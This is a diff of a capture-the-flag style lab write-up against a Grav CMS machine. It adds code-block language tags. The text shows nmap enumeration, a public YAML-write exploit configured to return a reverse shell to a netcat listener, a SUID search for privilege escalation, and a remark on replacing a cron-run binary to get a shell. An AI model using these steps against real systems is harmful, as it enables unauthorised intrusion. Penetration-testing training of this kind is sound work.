@@ -18,7 +18,7 @@ Initial enumeration of the machine was done with: `nmap -sC -sV -oA nmap/initial
 ```
 
 Following a scan of all TCP ports, the results below show only port 80 is open which simplifies what to look at next.
-```
+```bash
 # Nmap 7.94 scan initiated Fri Nov 10 08:29:45 2023 as: nmap -sC -sV -oA nmap/initial -p- 192.168.245.12
 Nmap scan report for 192.168.245.12
 Host is up (0.015s latency).
@@ -46,7 +46,7 @@ Review of the initial nmap scan we identify that port 80 is open. Browsing to th
 ![Grav-Webpage](/img/pg/astronaut/grav-webpage.png)
 
 Using SearchSploit we can see a few possible exploits. Cross-site scripting is generally not going to provide us with an entry point. The Server-Side Template Injection requires authentication. Arbitrary YAML Write/Update could work so we take a look at the exploit details. 
-```
+```bash
 searchsploit "Grav CMS"
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                  |  Path
@@ -63,7 +63,7 @@ Shellcodes: No Results
 
 # Initial Access
 With a potential exploit identified, we should take a moment to review the source code . Taking a look at the 49973.py exploit, we see a target is hardcoded in a variable named `target` and a base64 encoded payload and an example of how to replace it. 
-```
+```python
 ... shortened for brevity...
 
 target= "http://192.168.1.2"
@@ -80,7 +80,7 @@ In our case, we can replace the target with our target `192.168.245.12` and can 
 
 
 As we specified in the payload, we setup a netcat listener on port 4444 using `nc -nlvp 4444`. Once setup we can run the exploit using `python 49973.py`. It may take a few moments for the shell to be returned. After waiting for a minute, we recieve the reverse shell as the user www-data.
-```
+```bash
 nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [192.168.45.240] from (UNKNOWN) [192.168.245.12] 41192
@@ -94,7 +94,7 @@ Doing some quick enumeration we can check to see if we can run any commands as r
 
 Another quick check we can perform is looking for any binaries set with a SUID bit. This would allow that binary to be run as the user who owns the binary. Most often this is the root user. To test it we can run the following:
 
-```
+```bash
 find / -perm -u=s -type f 2>/dev/null
 
 ...shortened for brevity...
@@ -139,7 +139,7 @@ drwx------  2 root root 4096 Jan 24  2023 .ssh
 # Other Notes
 When performing my enumeration following gaining my foothold, I found a cron job that ran every minute. This at first appeared to be the path to escalation. However, when taking a close look at the grav binary, it should be noted that this is owned and run by the `www-data` user. While its possible to replace this with a malicious binary and recieve a reverse shell. Doing so would result in a reverse shell as the `www-data` user. Had this cron job been run as root, we could have leveraged it. 
 
-```
+```bash
 www-data@gravity:~/html/grav-admin/bin$ crontab -l
 crontab -l
 * * * * * cd /var/www/html/grav-admin;/usr/bin/php bin/grav scheduler 1>> /dev/null 2>&1
